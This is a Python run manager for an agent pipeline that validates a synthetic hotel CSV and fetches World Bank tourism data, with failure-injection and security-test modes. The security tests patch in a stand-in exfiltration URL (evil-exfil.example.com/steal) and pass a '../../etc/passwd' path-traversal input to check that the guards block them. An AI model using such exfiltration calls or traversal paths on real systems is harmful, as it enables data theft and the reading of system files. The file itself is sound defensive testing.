import uuid
import json
import logging

from pathlib import Path
from datetime import datetime, timezone

from executor import Executor, Journal, get_cache_stats, clear_dp_cache
from critic import Critic
from planner import Planner

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%H:%M:%S",
)

logger = logging.getLogger(__name__)

LOGS_DIR = Path("logs")
LOGS_DIR.mkdir(exist_ok=True)

MAX_RETRIES = 3

# SECURITY ERROR DETECTION

_SECURITY_MARKERS = [
    "SECURITY_VIOLATION",
    "PATH_NOT_ALLOWED",
    "HOST_NOT_ALLOWED",
    "BLOCKED",
    "PERMISSION",
    "PERMISSIONERROR",
]


def _is_security_error(error: Exception) -> bool:
    msg = str(error).upper()
    return any(marker in msg for marker in _SECURITY_MARKERS)


# ============================================================
# FAILURE HANDLING
# ============================================================

def _handle_failure(step_name: str, error: Exception, retries: int):

    if _is_security_error(error):
        logger.warning(
            "Step [%s] BLOCKED by security policy: %s. "
            "Retry budget NOT consumed.",
            step_name, error
        )
        return "security_stop", retries

    retries += 1

    if retries < MAX_RETRIES:
        logger.info(
            "Step [%s] failed (attempt %d/%d). "
            "Retrying. Error: %s",
            step_name, retries, MAX_RETRIES, error
        )
        return "retry", retries

    logger.error(
        "Step [%s] exhausted retry budget (%d/%d). "
        "Stopping. Error: %s",
        step_name, retries, MAX_RETRIES, error
    )
    return "stop", retries


# ============================================================
# FINAL STATUS LOGGER
# ============================================================

def _log_final_status(run_id: str, status: str, last_error=None):

    if status == "success":
        logger.info("Run %s completed SUCCESSFULLY.", run_id)
    elif status == "security_stop":
        logger.critical(
            "Run %s HALTED by security policy. "
            "No retries granted.", run_id
        )
    else:
        logger.error(
            "Run %s FAILED. "
            "Final status=%r. "
            "Last error: %s",
            run_id, status, last_error
        )


def _unwrap_report(report):
    if isinstance(report, dict) and "report" in report:
        return report["report"]
    return report


# ============================================================
# SCENARIO 1
# ============================================================

def run_scenario1(file_path: str,expected_columns: list = None,failure_injection: str = None,) -> dict:

    if expected_columns is None:
        expected_columns = [
            "region",
            "hotel_name",
            "month",
            "occupancy_rate",
            "revenue_tnd",
        ]

    if failure_injection == "missing_column":
        logger.warning("FAILURE INJECTION: adding fake column")
        expected_columns = expected_columns + ["occupancy_rate_MISSING"]

    run_id = (
        f"run_"
        f"{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}_"
        f"{uuid.uuid4().hex[:6]}"
    )

    logger.info("=" * 60)
    logger.info(f"Starting Scenario 1 run: {run_id}")
    logger.info(f"file_path: {file_path}")
    logger.info(f"failure_injection: {failure_injection or 'none'}")
    logger.info("=" * 60)

    journal  = Journal(run_id)
    executor = Executor(run_id, journal)
    critic   = Critic()
    planner  = Planner()

    retries      = 0
    final_status = "failed"
    last_error   = None

    task = {
        "file_path":        file_path,
        "expected_columns": expected_columns,
    }

    try:
        planner_result = planner.run(task, executor, critic)
        final_status   = planner_result["status"]

    except Exception as err:
        action, retries = _handle_failure("planner_run", err, retries)
        last_error = err

        if action == "security_stop":
            final_status = "security_stop"
        elif action == "stop":
            final_status = "failed"
        elif action == "retry":
            logger.info("Retry requested but manual retry loop not implemented.")
            final_status = "failed"

        planner_result = {
            "status": final_status,
            "report": None,
            "error":  str(err),
            "state":  type(
                "obj", (object,),
                {"steps_taken": 0, "retries": retries}
            )()
        }

    critic_verdict = {"passed": False, "reason": "Plan failed before evaluation"}
    if planner_result["status"] == "success":
        critic_verdict = critic.evaluate_run(
            planner_result["state"], journal
        )

    result = {
        "run_id":         run_id,
        "status":         final_status,
        "report":         _unwrap_report(planner_result.get("report")),
        "error":          planner_result.get("error"),
        "journal":        journal.to_dict(),
        "critic_verdict": critic_verdict,
        "steps_taken":    planner_result["state"].steps_taken,
        "retries":        retries,
    }

    journal_path = LOGS_DIR / f"{run_id}.json"
    journal.save(str(journal_path))
    logger.info(f"Journal saved: {journal_path}")

    _log_final_status(run_id, final_status, last_error)
    logger.info("=" * 60)

    if result["status"] == "success":
        logger.info("Run SUCCEEDED")
        logger.info(f"Report: {json.dumps(result['report'], indent=2)}")
    else:
        logger.info(f"Run FAILED: {result['error']}")

    logger.info(f"Steps taken: {result['steps_taken']}")
    logger.info(f"Retries    : {result['retries']}")
    logger.info("=" * 60)

    return result


# ============================================================
# SCENARIO 2
# ============================================================

def run_scenario2(
    indicator_key:   str  = "arrivals",
    inject_timeout:  bool = False,
    inject_bad_host: bool = False,
) -> dict:
    """
    Run Scenario 2: World Bank API → validate → chart-ready JSON.

    Parameters
    ----------
    indicator_key   : 'arrivals' | 'receipts' | 'departures'
    inject_timeout  : True → simulate API timeout (failure injection)
    inject_bad_host : True → blocked host (security test)
    """

    # FAILURE INJECTION: bad host
    if inject_bad_host:
        import executor as _exe
        _orig_endpoint = _exe.WB_ENDPOINT
        _exe.WB_ENDPOINT = (
            "https://evil-exfil.example.com/steal?indicator={indicator}"
        )
        logger.warning("FAILURE INJECTION: bad host patched into WB_ENDPOINT")

    run_id = (
        f"run_s2_"
        f"{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}_"
        f"{uuid.uuid4().hex[:6]}"
    )

    logger.info("=" * 60)
    logger.info(f"Starting Scenario 2 run: {run_id}")
    logger.info(f"indicator_key  : {indicator_key}")
    logger.info(f"inject_timeout : {inject_timeout}")
    logger.info(f"inject_bad_host: {inject_bad_host}")
    logger.info("=" * 60)

    journal  = Journal(run_id)
    executor = Executor(run_id, journal)
    critic   = Critic()
    planner  = Planner()

    retries      = 0
    final_status = "failed"
    last_error   = None

    task = {
        "indicator_key":  indicator_key,
        "inject_timeout": inject_timeout,
    }

    try:
        planner_result = planner.run_scenario2(task, executor, critic)
        final_status   = planner_result["status"]

    except Exception as err:
        action, retries = _handle_failure("planner_run_s2", err, retries)
        last_error = err

        if action == "security_stop":
            final_status = "security_stop"
        else:
            final_status = "failed"

        planner_result = {
            "status": final_status,
            "report": None,
            "error":  str(err),
            "state":  type(
                "obj", (object,),
                {"steps_taken": 0, "retries": retries}
            )()
        }

    critic_verdict = {"passed": False, "reason": "Plan failed before evaluation"}
    if planner_result["status"] == "success":
        critic_verdict = critic.evaluate_run_scenario2(
            planner_result["state"], journal
        )

    # DP cache stats
    cache_stats = get_cache_stats()
    logger.info(
        "[DP] Cache stats: hits=%d misses=%d hit_ratio=%.2f",
        cache_stats["cache_hits"],
        cache_stats["cache_misses"],
        cache_stats["hit_ratio"],
    )

    result = {
        "run_id":          run_id,
        "status":          final_status,
        "report":          planner_result.get("report"),
        "error":           planner_result.get("error"),
        "journal":         journal.to_dict(),
        "critic_verdict":  critic_verdict,
        "steps_taken":     planner_result["state"].steps_taken,
        "retries":         retries,
        "dp_cache_stats":  cache_stats,
    }

    journal_path = LOGS_DIR / f"{run_id}.json"
    journal.save(str(journal_path))
    logger.info(f"Journal saved: {journal_path}")

    # Restore patched URL
    if inject_bad_host:
        import executor as _exe
        _exe.WB_ENDPOINT = _orig_endpoint

    _log_final_status(run_id, final_status, last_error)
    logger.info("=" * 60)

    if result["status"] == "success":
        logger.info("Run SUCCEEDED")
        logger.info(f"Report: {json.dumps(result['report'], indent=2)}")
    else:
        logger.info(f"Run FAILED: {result['error']}")

    logger.info(f"Steps taken : {result['steps_taken']}")
    logger.info(f"Retries     : {result['retries']}")
    logger.info(f"DP hit ratio: {cache_stats['hit_ratio']}")
    logger.info("=" * 60)

    return result


# ============================================================
# DP BENCHMARK  (BT-only vs BT+DP — required by Section 8)
# ============================================================

def run_dp_benchmark() -> dict:
    """
    Run the same indicator TWICE to measure DP speedup:
      Run 1 → cold cache (network call)
      Run 2 → warm cache (no network call)
    """
    import time

    print("\n" + "=" * 60)
    print("DP BENCHMARK: cold cache  vs  warm cache")
    print("=" * 60)

    clear_dp_cache()
    t0      = time.monotonic()
    run_scenario2(indicator_key="arrivals")
    cold_ms = int((time.monotonic() - t0) * 1000)

    t0      = time.monotonic()
    run_scenario2(indicator_key="arrivals")
    warm_ms = int((time.monotonic() - t0) * 1000)

    stats = get_cache_stats()

    print(f"\nRun 1 (cold cache) latency : {cold_ms} ms")
    print(f"Run 2 (warm cache) latency : {warm_ms} ms")
    print(f"Speedup                    : {round(cold_ms / max(warm_ms,1), 2)}x")
    print(f"Cache hit ratio            : {stats['hit_ratio']}")
    print("=" * 60 + "\n")

    return {
        "cold_ms":   cold_ms,
        "warm_ms":   warm_ms,
        "speedup":   round(cold_ms / max(warm_ms, 1), 2),
        "hit_ratio": stats["hit_ratio"],
    }


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":

    import sys

    mode = sys.argv[1] if len(sys.argv) > 1 else "normal"

    # ── SCENARIO 1 ─────────────────────────────────────────
    if mode == "normal":
        print("\nRunning Scenario 1 — Happy Path\n")
        result = run_scenario1("data_synthetic/hotels.csv")

    elif mode == "inject":
        print("\nRunning Scenario 1 — Injected Failure\n")
        result = run_scenario1(
            "data_synthetic/hotels.csv",
            failure_injection="missing_column",
        )

    elif mode == "security":
        print("\nRunning Scenario 1 — Security Test\n")
        result = run_scenario1("../../etc/passwd")

    # ── SCENARIO 2 ─────────────────────────────────────────
    elif mode == "s2_normal":
        print("\nRunning Scenario 2 — Happy Path\n")
        result = run_scenario2(indicator_key="arrivals")

    elif mode == "s2_inject":
        print("\nRunning Scenario 2 — Injected Timeout\n")
        result = run_scenario2(
            indicator_key="arrivals",
            inject_timeout=True,
        )

    elif mode == "s2_security":
        print("\nRunning Scenario 2 — Security Test (bad host)\n")
        result = run_scenario2(
            indicator_key="arrivals",
            inject_bad_host=True,
        )

    elif mode == "s2_benchmark":
        print("\nRunning Scenario 2 — DP Benchmark\n")
        benchmark = run_dp_benchmark()
        print(json.dumps(benchmark, indent=2))
        sys.exit(0)

    else:
        print(
            f"Unknown mode '{mode}'. Use:\n"
            f"  python run_manager_afterhardening.py "
            f"[normal|inject|security|s2_normal|s2_inject|s2_security|s2_benchmark]"
        )
        sys.exit(1)

    # ── OUTPUT ─────────────────────────────────────────────
    print(f"\nFinal status: {result['status']}")

    if result.get("report"):
        print(f"Report:\n{json.dumps(result['report'], indent=2)}")

    if result.get("error"):
        print(f"Error: {result['error']}")
